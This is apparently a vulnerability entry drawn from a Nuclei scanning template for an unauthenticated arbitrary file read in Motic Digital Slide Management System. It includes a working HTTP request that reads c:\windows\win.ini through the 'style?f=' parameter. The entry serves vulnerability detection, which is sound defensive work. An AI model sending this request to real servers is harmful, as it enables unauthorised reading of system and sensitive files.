# Vulnerability: MoticDSM - Arbitrary File Read
**Classification:** MOTICDSM
**Source:** Nuclei Template (`motic-dsm-arbitrary-file-read.yaml`)

## Description
Motic Digital Slide Management System style has an arbitrary file reading vulnerability. Unauthenticated attackers can exploit this vulnerability to read important system files, leaving the website in a highly insecure state.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /UploadService/Page/ HTTP/1.1
Host: {{Hostname}}

GET /UploadService/Page/style?f=c:\windows\win.ini HTTP/1.1
Host: {{Hostname}}
```

